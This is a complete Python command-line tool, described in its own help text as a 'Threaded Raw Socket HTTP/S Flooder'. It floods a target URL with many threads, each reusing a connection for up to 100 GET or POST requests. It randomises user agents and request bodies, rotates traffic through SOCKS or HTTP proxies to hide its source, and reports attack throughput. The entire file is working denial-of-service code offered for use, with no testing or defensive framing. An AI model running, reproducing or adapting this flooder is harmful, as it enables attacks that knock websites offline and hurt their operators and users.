import threading
import random
import sys
import string
import ssl
import argparse
import signal
import socket
import queue
import logging
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, List, Tuple, Dict, NamedTuple
from urllib.parse import urlparse, ParseResult
import socks

CONNECT_TIMEOUT = 10
READ_WRITE_TIMEOUT = 15
REQUESTS_PER_CONNECTION = 100
STATS_INTERVAL = 5
DEFAULT_USER_AGENTS_FILE = 'default/useragents.txt'
DEFAULT_ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/xml,application/json,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5"
]
INTER_REQUEST_SLEEP = 0.0
FAIL_SLEEP = 0.5

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] (%(threadName)s) %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

class ProxyTuple(NamedTuple):
    host: str
    port: int
    original_str: str

class ThreadGroupProxyManager:
    def __init__(self, proxy_type: Optional[str] = None, proxy_file: Optional[str] = None):
        self.proxy_type: Optional[str] = proxy_type
        self.proxy_file: Optional[str] = proxy_file
        self.proxies: queue.Queue[Optional[ProxyTuple]] = queue.Queue()
        self._initial_proxy_count = 0
        if self.proxy_type and self.proxy_file and self.proxy_type != 'direct':
            self.load_proxies()
        elif self.proxy_type == 'direct':
             logger.info("Using direct connection mode.")
        else:
             pass

    def _parse_proxy(self, proxy_str: str) -> Optional[ProxyTuple]:
        try:
            host, port_str = proxy_str.split(':', 1)
            port = int(port_str)
            if not host or port <= 0 or port > 65535:
                 raise ValueError("Invalid host or port")
            return ProxyTuple(host=host, port=port, original_str=proxy_str)
        except ValueError as e:
            logger.warning(f"Skipping invalid proxy line '{proxy_str}': {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error parsing proxy '{proxy_str}': {e}")
            return None

    def load_proxies(self) -> None:
        count = 0
        try:
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    proxy_str = line.strip()
                    if proxy_str and not proxy_str.startswith('#'):
                        parsed_proxy = self._parse_proxy(proxy_str)
                        if parsed_proxy:
                            self.proxies.put(parsed_proxy)
                            count += 1
            self._initial_proxy_count = count
            if count > 0:
                logger.info(f"Loaded and parsed {count} {self.proxy_type} proxies from {self.proxy_file}")
            else:
                logger.warning(f"No valid proxies found or loaded from {self.proxy_file}")
        except FileNotFoundError:
            logger.error(f"Proxy file not found: {self.proxy_file}")
            sys.exit(1)
        except Exception as e:
            logger.error(f"Error loading proxies from {self.proxy_file}: {e}")
            sys.exit(1)

    def get_proxy(self) -> Optional[ProxyTuple]:
        if self.proxy_type == 'direct':
            return None
        try:
            proxy = self.proxies.get(timeout=0.1)
            self.proxies.put(proxy)
            return proxy
        except queue.Empty:
             return None
        except Exception as e:
            logger.error(f"Error getting proxy from queue: {e}")
            return None

    def get_proxy_count(self) -> int:
        return self.proxies.qsize()

class ResourceManager:
    _user_agents: List[str] = []
    _accept_headers: List[str] = DEFAULT_ACCEPT_HEADERS
    _loaded = False
    _lock = threading.Lock()

    def __init__(self, user_agents_file: str = DEFAULT_USER_AGENTS_FILE):
        if not ResourceManager._loaded:
            with ResourceManager._lock:
                if not ResourceManager._loaded:
                    ResourceManager._user_agents = self._load_user_agents(user_agents_file)
                    ResourceManager._loaded = True

    def _load_user_agents(self, filename: str) -> List[str]:
        default_ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
        try:
            with open(filename, 'r') as f:
                uas = [line.strip() for line in f if line.strip()]
            if not uas:
                logger.warning(f"No user agents loaded from {filename}. Using a default.")
                return default_ua
            logger.info(f"Loaded {len(uas)} user agents from {filename}")
            return uas
        except FileNotFoundError:
            logger.error(f"User agents file not found: {filename}. Using a default.")
            return default_ua
        except Exception as e:
            logger.error(f"Error loading user agents from {filename}: {e}. Using a default.")
            return default_ua

    def get_random_ua(self) -> str:
        return random.choice(ResourceManager._user_agents) if ResourceManager._user_agents else ResourceManager._user_agents[0]

    def get_random_accept(self) -> str:
        return random.choice(ResourceManager._accept_headers)

def create_connection(target: ParseResult, proxy: Optional[ProxyTuple], proxy_type: Optional[str]) -> Optional[socket.socket]:
    sock = None
    target_host = target.hostname
    target_port = target.port or (443 if target.scheme == 'https' else 80)
    use_ssl = target.scheme == 'https'
    try:
        if proxy is None:
            sock = socket.create_connection((target_host, target_port), timeout=CONNECT_TIMEOUT)
        elif proxy_type in ['socks4', 'socks5']:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(
                socks.SOCKS4 if proxy_type == 'socks4' else socks.SOCKS5,
                proxy.host,
                proxy.port
            )
            sock.settimeout(CONNECT_TIMEOUT)
            sock.connect((target_host, target_port))
        elif proxy_type in ['http', 'https']:
            sock = socket.create_connection((proxy.host, proxy.port), timeout=CONNECT_TIMEOUT)
            if use_ssl:
                connect_str = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
                connect_str += f"Host: {target_host}:{target_port}\r\n\r\n"
                sock.sendall(connect_str.encode('utf-8'))
                sock.settimeout(READ_WRITE_TIMEOUT)
                response = sock.recv(4096)
                if not response.startswith(b"HTTP/1.1 200") and not response.startswith(b"HTTP/1.0 200"):
                    raise ConnectionRefusedError(f"Proxy CONNECT failed: {response.decode('utf-8', errors='ignore').strip()}")
        else:
             logger.error(f"Unsupported proxy type for connection: {proxy_type}")
             return None

        if use_ssl:
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
             sock = context.wrap_socket(sock, server_hostname=target_host)
        sock.settimeout(READ_WRITE_TIMEOUT)
        return sock
    except (socket.timeout, socks.ProxyConnectionError, socks.GeneralProxyError, ConnectionRefusedError, OSError) as e:
        proxy_display = proxy.original_str if proxy else "direct"
        if sock: sock.close()
        return None
    except Exception as e:
        proxy_display = proxy.original_str if proxy else "direct"
        logger.error(f"Unexpected error connecting via {proxy_display}: {e}", exc_info=False)
        if sock: sock.close()
        return None

def send_http_request(sock: socket.socket, target: ParseResult, method: str, headers: Dict, data: Optional[bytes]):
    path = target.path or "/"
    if target.query:
        path += "?" + target.query
    request_lines = []
    request_lines.append(f"{method.upper()} {path} HTTP/1.1")
    for key, value in headers.items():
        request_lines.append(f"{key}: {value}")
    if 'Host' not in headers and 'host' not in headers:
         request_lines.append(f"Host: {target.netloc}")
    if data:
        if 'Content-Length' not in headers and 'content-length' not in headers:
            request_lines.append(f"Content-Length: {len(data)}")
    request_str = "\r\n".join(request_lines) + "\r\n\r\n"
    request_bytes = request_str.encode('utf-8')
    if data:
        request_bytes += data
    sock.sendall(request_bytes)

class ThreadedFlooder:
    def __init__(self,
                 target_url: str,
                 num_workers: int,
                 http_method: str,
                 proxy_manager: ThreadGroupProxyManager,
                 resource_manager: ResourceManager):
        self.target_url: str = target_url
        self.parsed_url: ParseResult = urlparse(target_url)
        self.num_workers: int = num_workers
        self.http_method: str = http_method.upper()
        self.proxy_manager: ThreadGroupProxyManager = proxy_manager
        self.resource_manager: ResourceManager = resource_manager
        self.running: bool = True
        self.request_count: int = 0
        self.success_count: int = 0
        self.error_count: int = 0
        self.connection_errors: int = 0
        self.bytes_sent: int = 0
        self.start_time: float = 0.0
        self._lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=self.num_workers, thread_name_prefix='FlooderWorker')
        self.stats_thread = None

        if self.parsed_url.scheme not in ['http', 'https']:
            logger.error(f"Invalid URL scheme: {self.parsed_url.scheme}. Only http/https are supported.")
            sys.exit(1)
        if not self.parsed_url.netloc:
            logger.error(f"Invalid URL: Missing domain name.")
            sys.exit(1)

    def _increment_count(self, success: bool = False, conn_error: bool = False, bytes_val: int = 0):
        with self._lock:
            self.request_count += 1
            if success:
                self.success_count += 1
                self.bytes_sent += bytes_val
            elif conn_error:
                 self.connection_errors += 1
                 self.error_count +=1
            else:
                self.error_count += 1

    def flood_task(self):
        while self.running:
            sock = None
            proxy = None
            try:
                proxy = self.proxy_manager.get_proxy()
                proxy_display = proxy.original_str if proxy else "direct"
                if self.proxy_manager.proxy_type != 'direct' and proxy is None:
                    if self.proxy_manager.get_proxy_count() == 0:
                         logger.error("No proxies available and queue is empty. Worker stopping task.")
                         break
                    else:
                         time.sleep(0.2)
                         continue

                sock = create_connection(self.parsed_url, proxy, self.proxy_manager.proxy_type)
                if sock is None:
                    with self._lock: self.connection_errors += 1
                    time.sleep(FAIL_SLEEP)
                    continue

                headers = {
                    "User-Agent": self.resource_manager.get_random_ua(),
                    "Accept": self.resource_manager.get_random_accept(),
                    "Connection": "keep-alive",
                    "Host": self.parsed_url.netloc
                }
                post_data_bytes = None
                request_body_size = 0
                if self.http_method == "POST":
                    post_data = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
                    post_data_bytes = post_data.encode('utf-8')
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    request_body_size = len(post_data_bytes)

                header_size = len(f"{self.http_method} {self.parsed_url.path or '/'} HTTP/1.1\r\n") + \
                              sum(len(k) + len(v) + 4 for k, v in headers.items()) + 2 + \
                              len(f"Content-Length: {request_body_size}\r\n\r\n")
                approx_request_size = header_size + request_body_size

                for i in range(REQUESTS_PER_CONNECTION):
                    if not self.running: break
                    try:
                        send_http_request(sock, self.parsed_url, self.http_method, headers, post_data_bytes)
                        self._increment_count(success=True, bytes_val=approx_request_size)

                        if INTER_REQUEST_SLEEP > 0:
                            time.sleep(INTER_REQUEST_SLEEP)
                        else:
                            time.sleep(0)
                    except (socket.timeout, ssl.SSLError, BrokenPipeError, OSError) as send_err:
                        self._increment_count(success=False)
                        break
                    except Exception as send_ex:
                        logger.error(f"Unexpected send error on request {i+1} via {proxy_display}: {send_ex}", exc_info=False)
                        self._increment_count(success=False)
                        break
            except Exception as outer_ex:
                 logger.error(f"Worker task error: {outer_ex}", exc_info=False)
                 self._increment_count(success=False, conn_error=True)
                 time.sleep(FAIL_SLEEP)
            finally:
                if sock:
                    try:
                        sock.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    finally:
                         sock.close()

    def stats_reporter(self) -> None:
        logger.info("Statistics reporter started.")
        last_req_count = 0
        last_time = self.start_time
        while self.running:
            try:
                 for _ in range(int(STATS_INTERVAL * 10)):
                      if not self.running: return
                      time.sleep(0.1)
                 now = time.time()
                 elapsed_total = now - self.start_time
                 elapsed_interval = now - last_time

                 with self._lock:
                     current_req_count = self.request_count
                     current_success = self.success_count
                     current_errors = self.error_count
                     current_conn_err = self.connection_errors
                     current_bytes = self.bytes_sent

                 interval_req_count = current_req_count - last_req_count
                 rps_interval = interval_req_count / elapsed_interval if elapsed_interval > 0 else 0
                 rps_total = current_req_count / elapsed_total if elapsed_total > 0 else 0
                 success_rate = (current_success / current_req_count * 100) if current_req_count > 0 else 0
                 error_rate = (current_errors / current_req_count * 100) if current_req_count > 0 else 0
                 mb_sent = current_bytes / (1024 * 1024)
                 mbps = (mb_sent * 8) / elapsed_total if elapsed_total > 0 else 0
                 logger.info(
                    f"Stats: Time={elapsed_total:.1f}s | Req={current_req_count} | "
                    f"Success={current_success} ({success_rate:.1f}%) | "
                    f"Errors={current_errors} ({error_rate:.1f}%) [ConnErrs={current_conn_err}] | "
                    f"RPS={rps_interval:.2f} (avg: {rps_total:.2f}) | "
                    f"Sent={mb_sent:.2f} MB ({mbps:.2f} Mbps)"
                 )
                 last_req_count = current_req_count
                 last_time = now
            except Exception as e:
                 logger.error(f"Stats reporter error: {e}", exc_info=True)
                 time.sleep(STATS_INTERVAL)

    def _signal_handler(self, signum, frame):
        if self.running:
            sig_name = getattr(signal, f'SIG{signal.Signals(signum).name}', f'Signal {signum}')
            logger.warning(f"{sig_name} received! Stopping workers and reporter...")
            self.stop()
    def start(self):
        if self.proxy_manager.proxy_type != 'direct' and self.proxy_manager.get_proxy_count() == 0:
             if self.proxy_manager.proxy_file:
                 logger.error(f"No valid proxies were loaded from {self.proxy_manager.proxy_file}. Exiting.")
             else:
                 logger.error("Proxy usage requested but no proxy file or no proxies loaded. Exiting.")
             return
        logger.info(f"Starting {self.num_workers} workers for {self.target_url}")
        logger.info(f"Method: {self.http_method}, Proxy Type: {self.proxy_manager.proxy_type or 'direct'}")
        logger.info(f"Requests/Conn: {REQUESTS_PER_CONNECTION}, Connect Timeout: {CONNECT_TIMEOUT}s")
        self.running = True
        self.start_time = time.time()
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        self.stats_thread = threading.Thread(target=self.stats_reporter, name="StatsReporter", daemon=True)
        self.stats_thread.start()
        futures = [self.executor.submit(self.flood_task) for _ in range(self.num_workers)]
        logger.info(f"{len(futures)} worker tasks submitted to ThreadPoolExecutor.")
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
             logger.info("KeyboardInterrupt in main loop.")
             self.stop()
        except Exception as e:
             logger.critical(f"Critical error in main loop: {e}", exc_info=True)
             self.stop()
        finally:
             if self.running:
                 self.stop()
             logger.info("Main loop finished.")

    def stop(self):
        if not self.running: return
        logger.info("Initiating shutdown...")
        self.running = False
        logger.info("Shutting down thread pool executor...")
        self.executor.shutdown(wait=True, cancel_futures=False)
        logger.info("Executor shutdown complete.")
        if self.stats_thread and self.stats_thread.is_alive():
             logger.info("Waiting for stats reporter thread...")
             self.stats_thread.join(timeout=STATS_INTERVAL + 1)
             if self.stats_thread.is_alive():
                  logger.warning("Stats reporter thread did not exit cleanly.")
        logger.info("Shutdown sequence finished.")
        self.print_final_stats()

    def print_final_stats(self):
        runtime = time.time() - self.start_time
        with self._lock:
            final_req_count = self.request_count
            final_success = self.success_count
            final_errors = self.error_count
            final_conn_err = self.connection_errors
            final_bytes = self.bytes_sent
        rps = final_req_count / runtime if runtime > 0 else 0
        success_rate = (final_success / final_req_count * 100) if final_req_count > 0 else 0
        error_rate = (final_errors / final_req_count * 100) if final_req_count > 0 else 0
        mb_sent = final_bytes / (1024 * 1024)
        mbps = (mb_sent * 8) / runtime if runtime > 0 else 0
        print("\n" + "="*20 + " Final Statistics " + "="*20)
        print(f"Target URL:          {self.target_url}")
        print(f"Total Runtime:       {runtime:.2f} seconds")
        print(f"Total Req Attempts:  {final_req_count}")
        print(f"Successful Requests: {final_success} ({success_rate:.1f}%)")
        print(f"Failed Requests:     {final_errors} ({error_rate:.1f}%)")
        print(f"Connection Errors:   {final_conn_err}")
        print(f"Requests Per Second: {rps:.2f} (Average)")
        print(f"Total Data Sent:     {mb_sent:.2f} MB")
        print(f"Avg. Bandwidth Sent: {mbps:.2f} Mbps")
        print("="*58)

def main():
    global CONNECT_TIMEOUT, READ_WRITE_TIMEOUT, REQUESTS_PER_CONNECTION, STATS_INTERVAL, INTER_REQUEST_SLEEP, FAIL_SLEEP
    parser = argparse.ArgumentParser(
        description='Threaded Raw Socket HTTP/S Flooder - Optimized',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('url', type=str, help='Target URL (e.g., https://example.com)')
    parser.add_argument('workers', type=int, help='Number of concurrent worker threads')
    parser.add_argument('http_method', type=str, choices=['get', 'post'], help='HTTP method')
    parser.add_argument('--proxy-type', type=str, default='direct',
                        choices=['http', 'https', 'socks4', 'socks5', 'direct'], help='Proxy type')
    parser.add_argument('--proxy-file', type=str, default=None,
                        help='File containing proxies (host:port). Required if --proxy-type is not direct.')
    parser.add_argument('--user-agents', type=str, default=DEFAULT_USER_AGENTS_FILE,
                        help='File containing User-Agent strings')
    parser.add_argument('--connect-timeout', type=int, default=CONNECT_TIMEOUT,
                        help='Connection establishment timeout (seconds)')
    parser.add_argument('--rw-timeout', type=int, default=READ_WRITE_TIMEOUT,
                        help='Socket read/write operations timeout (seconds)')
    parser.add_argument('--reqs-per-conn', type=int, default=REQUESTS_PER_CONNECTION,
                        help='Max requests per keep-alive connection')
    parser.add_argument('--stats-interval', type=int, default=STATS_INTERVAL,
                        help='Interval for printing stats (seconds)')
    parser.add_argument('--inter-request-sleep', type=float, default=INTER_REQUEST_SLEEP,
                        help='Sleep time between requests on same connection (seconds, 0 to yield only)')
    parser.add_argument('--fail-sleep', type=float, default=FAIL_SLEEP,
                        help='Sleep time after a connection failure (seconds)')
    args = parser.parse_args()

    CONNECT_TIMEOUT = args.connect_timeout
    READ_WRITE_TIMEOUT = args.rw_timeout
    REQUESTS_PER_CONNECTION = args.reqs_per_conn
    STATS_INTERVAL = args.stats_interval
    INTER_REQUEST_SLEEP = args.inter_request_sleep
    FAIL_SLEEP = args.fail_sleep

    if args.proxy_type != 'direct' and not args.proxy_file:
        print("Error: --proxy-file is required when --proxy-type is not 'direct'", file=sys.stderr)
        sys.exit(1)
    if args.proxy_type == 'direct' and args.proxy_file:
        print("Warning: --proxy-file specified but --proxy-type is 'direct'. File ignored.", file=sys.stderr)
        args.proxy_file = None

    try:
        resource_manager = ResourceManager(user_agents_file=args.user_agents)
        proxy_manager = ThreadGroupProxyManager(proxy_type=args.proxy_type, proxy_file=args.proxy_file)
        flooder = ThreadedFlooder(
            target_url=args.url,
            num_workers=args.workers,
            http_method=args.http_method,
            proxy_manager=proxy_manager,
            resource_manager=resource_manager
        )
    except Exception as e:
        logger.error(f"Initialization failed: {e}", exc_info=True)
        sys.exit(1)

    flooder.start()

if __name__ == '__main__':
    import os
    if not os.path.exists('default'): os.makedirs('default', exist_ok=True)
    ua_path = 'default/useragents.txt'
    if not os.path.exists(ua_path):
        print(f"Creating dummy user agent file: {ua_path}")
        with open(ua_path, 'w') as f:
            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\n")
            f.write("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1\n")
    main()
